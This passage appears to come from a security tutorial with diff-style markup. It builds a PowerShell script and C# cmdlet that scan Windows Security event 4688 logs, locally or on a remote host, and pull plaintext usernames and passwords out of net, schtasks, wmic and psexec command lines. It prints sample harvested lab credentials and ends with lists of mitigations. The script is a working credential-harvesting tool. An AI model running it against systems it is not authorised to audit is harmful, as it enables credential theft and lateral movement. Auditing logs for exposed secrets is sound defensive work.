+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_IMPERSONATION, Mandatory = true)]
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = true)]
+        public string ComputerName { get; set; } = "localhost";
+
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = false)]
+        public string Username { get; set; }
+
+        [Parameter(ParameterSetName = GetEvents.PARAM_SET_REMOTE_EXPLICIT_CREDS, Mandatory = false)]
+        public string Password { get; set; }
+
+        protected override void BeginProcessing() {
+            base.BeginProcessing();
+
+            string query = this.GetQuery();
+
+            List<PSObject> events = EventLogReader.GetEvents(this.Logname, query,
+                this.ComputerName,
+                this.Username,
+                this.Password,
+                this.Timeout,
+                this.Max);
+            this.WriteObject(events, true);
+        }
+
+        private string GetQuery() {
+            if (string.IsNullOrEmpty(this.Query)) {
+                return "*";
+            }
+
+            return this.Query;
+        }
+
+        internal const string PARAM_SET_LOCAL = "Localhost";
+        internal const string PARAM_SET_REMOTE_IMPERSONATION = "Impersonation";
+        internal const string PARAM_SET_REMOTE_EXPLICIT_CREDS = "Explicit Credentials";
+    }
+}
+At long last, we can finally query the event log! The logs we’re looking for have an EventID of 4688 and are located in the ‘Security’ event log. There is a parameter for the log name, but we have to manually craft the query. The query is in XPath 1.0 (light) format. We’re looking for all events where there is a sub-node called System with a Attribute called EventID that is equal to 4688 and where there is a sub-node called EventData where the value is not empty (this part eliminates about half of the logs on my machine). The resulting command looks like this:
+#Query the windows events
+$events = Get-Events -Logname 'Security' -Query '*[System[(EventID=4688)]]' -ComputerName $ComputerName -Username $Username -Password $Password;
+Step 5: Parse Events for Credentials
+Now that we have a set of events, we need to use our regular expressions we created above to check each event for exposed credentials. We’ll first need to loop over each event. For each event $event, we’ll start by ensuring that the password expression matches on the CommandLine field. If that doesn’t match, then we drop down to searching for commands with unnamed password arguments. Once we find a password like argument, we check for a username argument. Then we collect the TimeStamp of the field and generate an output with the extracted username and password. We include the full CommandLine for context as some of the passwords might not be exactly copy and paste since they may contain commandline escape characters.
+$command = $event.EventData.Commandline;
+
+#Skip if commandoine is null or empty
+if([string]::IsNullOrEmpty($command)) {
+	continue;
+}
+
+#Skip if a password is not found
+$password_match = $regex_password.Match($command);
+if($password_match.Success -and $password_match.Groups['password'].Success) {
+	#Skip if no username found
+	$username_match = $regex_username.Match($command);
+	if(!$username_match.Success -or !$username_match.Groups['username'].Success) {
+		continue;
+	}
+
+	$date = [DateTime]::Parse($event.System.TimeCreated.SystemTime);
+
+	#Generate output
+	$result = New-Object psobject -Property @{
+		Computer = $event.System.Computer;
+		Username = $username_match.Groups['username'].Value;
+		Password = $password_match.Groups['password'].Value;
+		Commandline = $command;
+		EventTimestamp = $date;
+	}
+
+	[void]$results.Add($result);
+
+	continue;
+}
+At this point, we know there wasn’t a credential embedded in a named parameter, so let’s look at commands with unnamed password parameters. We have a set of these we need to run through, so we loop over each $expression and check if it matches. For these, each expression contains both a ‘username’ and ‘password’ named capture group that we can use to extract the credential information. We then build the output object in the same manner and format as before.
+foreach($expression in $expressions) {
+	$match = $expression.Match($command);
+	if($match.Success) {
+		$date = [DateTime]::Parse($event.System.TimeCreated.SystemTime);
+
+		#Generate output
+		$result = New-Object psobject -Property @{
+			Computer = $event.System.Computer;
+			Username = $match.Groups['username'].Value;
+			Password = $match.Groups['password'].Value;
+			Commandline = $command;
+			EventTimestamp = $date;
+		}
+
+		[void]$results.Add($result);
+	}
+}
+Lastly, we output the results with the most important information up front and the longest fields (e.g. CommandLine) further to the right so that the output doesn’t get stomped by a long CommandLine field.
+$results | Select Username,Password,EventTimestamp,Computer,Commandline;
+Full Script
+Putting it all together, here is the full script:
+
+param (
+	[Parameter(ParameterSetName = "Impersonation", Mandatory = $False, HelpMessage = "System to search through logs.")]
+	[Parameter(ParameterSetName = "Username and Password", Mandatory = $True, HelpMessage = "System to search through logs.")]
+	[string]$ComputerName = "localhost",
+
+	[Parameter(ParameterSetName = "Username and Password", Mandatory = $True, HelpMessage = "The username to authenticate with.")]
+	[string]$Username,
+
+	[Parameter(ParameterSetName = "Username and Password", Mandatory = $True, HelpMessage = "The password to authenticate with.")]
+	[string]$Password
+)
+
+#Load dependencies
+load EventLog;
+
+#Do some shenanigans to bxor the two options together in a way that is PowerShell 2.0 compliant
+$options = [System.Text.RegularExpressions.RegexOptions](([System.Int32][System.Text.RegularExpressions.RegexOptions]::Compiled) + ([System.Int32][System.Text.RegularExpressions.RegexOptions]::IgnoreCase));
+
+#Define a regular expression to parse the username
+$regex_username_str = '(?:(?:(?:-u)|(?:-user)|(?:-username)|(?:--user)|(?:--username)|(?:/u)|(?:/USER)|(?:/USERNAME))(?:\s+|\:)(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)))';
+$regex_username = New-Object System.Text.RegularExpressions.Regex($regex_username_str, $options);
+
+#Define a regular expression to parse the password
+$regex_password_str = '(?:(?:(?:-p)|(?:-password)|(?:-passwd)|(?:--password)|(?:--passwd)|(?:/P)|(?:/PASSWD)|(?:/PASSWORD))(?:\s+|\:)(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)))';
+$regex_password = New-Object System.Text.RegularExpressions.Regex($regex_password_str, $options);
+
+#Define command specific expressions
+$expressions = New-Object 'System.Collections.Generic.List[regex]';
+
+#"C:\Windows\system32\net.exe" user Administrator 1qaz!QAZ /domain 
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('net.+user\s+(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#"C:\Windows\system32\net.exe" use \\server\share /user:domain\username password
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('net.+use\s+(?<share>\\\\\S+)\s+/USER:(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#schtasks.exe /CREATE /S 192.168.1.103 /RU SYSTEM /U administrator@lab.net /P "1qaz!QAZ" /SC ONCE /ST 23:59 /TN Test /TR hostname /F
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('schtasks.+/U\s+(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)).+/P\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#wmic.exe /node:192.168.1.2 /user:administrator@lab.net /password:1qaz!QAZ computersystem get
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('wmic.+/user:\s*(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)).+/password:\s*(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#psexec \\remote_computer -u administrator@lab.net -p 1qaz!QAZ hostname
+$expressions.Add((New-Object System.Text.RegularExpressions.Regex('psexec.+-u\s+(?<username>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+)).+-p\s+(?<password>(?:"((?:\\.|[^"\\])*)")|(?:[^\s"]+))', $options)));
+
+#Query the windows events
+$events = Get-Events -Logname 'Security' -Query "*[System/EventID=4688] and *[EventData/Data[@Name='CommandLine']!='']" -ComputerName $ComputerName -Username $Username -Password $Password;
+
+$results = New-Object System.Collections.ArrayList;
+foreach($event in $events) {
+	$command = $event.EventData.Commandline;
+
+	#Skip if commandoine is null or empty
+	if([string]::IsNullOrEmpty($command)) {
+		continue;
+	}
+
+	#Skip if a password is not found
+	$password_match = $regex_password.Match($command);
+	if($password_match.Success -and $password_match.Groups['password'].Success) {
+		#Skip if no username found
+		$username_match = $regex_username.Match($command);
+		if(!$username_match.Success -or !$username_match.Groups['username'].Success) {
+			continue;
+		}
+
+		$date = [DateTime]::Parse($event.System.TimeCreated.SystemTime);
+
+		#Generate output
+		$result = New-Object psobject -Property @{
+			Computer = $event.System.Computer;
+			Username = $username_match.Groups['username'].Value;
+			Password = $password_match.Groups['password'].Value;
+			Commandline = $command;
+			EventTimestamp = $date;
+		}
+
+		[void]$results.Add($result);
+
+		continue;
+	}
+
+	foreach($expression in $expressions) {
+		$match = $expression.Match($command);
+		if($match.Success) {
+			$date = [DateTime]::Parse($event.System.TimeCreated.SystemTime);
+
+			#Generate output
+			$result = New-Object psobject -Property @{
+				Computer = $event.System.Computer;
+				Username = $match.Groups['username'].Value;
+				Password = $match.Groups['password'].Value;
+				Commandline = $command;
+				EventTimestamp = $date;
+			}
+
+			[void]$results.Add($result);
+		}
+	}
+}
+
+$results | Select Username,Password,EventTimestamp,Computer,Commandline;
+Expected Output
+The output from this script should look like this:
+Username               Password                             EventTimestamp        Computer         Commandline
+--------               --------                             --------------        --------         -----------
+"Backup Administrator" f6f620da-3c7e-40d2-8b31-86b20a9afef8 9/13/2024 4:24:56 PM  WKST-001.lab.net "C:\Windows\system32\net.exe" user "Backup Administrator" f6f620da-3c7e-40d2-8b31-86b20a9afef8 /ADD /Y
+"Backup Administrator" f6f620da-3c7e-40d2-8b31-86b20a9afef8 9/13/2024 4:24:56 PM  WKST-001.lab.net C:\Windows\system32\net1 user "Backup Administrator" f6f620da-3c7e-40d2-8b31-86b20a9afef8 /ADD /Y
+john.doe               1qaz!QAZ                             9/13/2024 10:54:40 PM WKST-001.lab.net "C:\Windows\system32\net.exe" user john.doe 1qaz!QAZ /domain
+john.doe               1qaz!QAZ                             9/13/2024 10:54:40 PM WKST-001.lab.net C:\Windows\system32\net1 user john.doe 1qaz!QAZ /domain
+administrator@lab.net  1qaz!QAZ                             9/13/2024 10:58:02 PM WKST-001.lab.net "C:\Windows\System32\Wbem\WMIC.exe" /node:192.168.1.2 /user:administrator@lab.net /password:1qaz!QAZ computersystem get
+administrator@lab.net  1qaz!QAZ                             9/14/2024 11:15:54 PM WKST-001.lab.net "C:\Windows\system32\schtasks.exe" /CREATE /S 192.168.1.103 /RU SYSTEM /U administrator@lab.net /P 1qaz!QAZ /SC ONCE /ST 23:59 /TN Test /TR hostname /F
+
+
+Expanded Security Risks:
+
+      1.    Credential Exposure at Scale:
+      •     Multiple User Credentials:
+      •     Logs can contain credentials for multiple users, increasing the attack surface and potential damage.
+      2.    Credential Reuse in Further Attacks:
+      •     Phishing Campaigns:
+      •     Leaked credentials can be used to craft more convincing phishing emails.
+      •     Brute Force Attacks:
+      •     Attackers can try the leaked credentials on other systems and services.
+      3.    Compliance and Legal Risks:
+      •     Violation of Internal Policies:
+      •     Logging credentials in plain text can violate internal information security policies.
+      •     Legal Penalties:
+      •     Exposing sensitive information, like customer or employee data, may result in legal penalties.
+
+Expanded Security Recommendations:
+
+      1.    Review and Update Logging Policies:
+      •     Configure Applications and Services:
+      •     Ensure applications are not logging sensitive information like credentials.
+      •     Example: Modify logging settings in web applications to mask error messages or sensitive data.
+      •     Use Secure Logging Libraries:
+      •     Implement libraries that sanitize data before logging.
+      •     Example: Utilize Log4Net or similar libraries with configurations that prevent sensitive data from being logged.
+      2.    Implement Strict Access Controls:
+      •     Restrict Permissions:
+      •     Ensure only authorized personnel have access to logs, especially those containing sensitive information.
+      •     Example: Set up Access Control Lists (ACLs) to limit who can read or modify log files.
+      •     Monitor Access:
+      •     Use security logs to track who accesses the log files and detect any unauthorized access.
+      •     Example: Use security logs to monitor attempts to access the log directories.
+      3.    Apply Encryption and Protection:
+      •     Encrypt Logs:
+      •     Encrypt log files, both at rest and in transit.
+      •     Example: Use BitLocker to encrypt the volume where logs are stored.
+      •     Use Role-Based Access Control (RBAC):
+      •     Ensure only necessary personnel have access to logs with sensitive information and enforce Multi-Factor Authentication (MFA).
+      4.    Training and Awareness:
+      •     Developer Training:
+      •     Train developers on best practices for logging and error handling.
+      •     Example: Conduct workshops on how to handle exceptions without exposing sensitive information.
+      •     Employee Awareness:
+      •     Regularly remind employees about the dangers of logging sensitive information.
+      •     Example: Send out security bulletins with best practices for logging.
+      5.    Automated Detection Tools:
+      •     Log Scanning Tools:
+      •     Use tools that automatically scan logs for sensitive information like credentials.
+      •     Example: Deploy SIEM systems that have predefined rules for detecting sensitive data in logs.
+      •     Vulnerability Management Tools:
+      •     Regularly assess applications and services to identify potential logging of sensitive data.
+      6.    Perform Security Testing:
+      •     Penetration Testing:
+      •     Regularly conduct penetration tests to identify vulnerabilities, including log analysis.
+      •     Example: Hire external security experts to test the systems and logs.
+      •     Security Audits:
+      •     Conduct periodic audits to ensure compliance with security policies and best practices.
+      7.    Keep Systems Updated:
+      •     Apply Security Updates:
+      •     Regularly update the operating system and applications to patch known vulnerabilities.
+      •     Example: Use Windows Update services to keep systems up to date.
+      •     Stay Informed:
+      •     Monitor the latest cybersecurity threats and attack methods related to log security.
+      •     Example: Subscribe to security advisories from trusted sources.
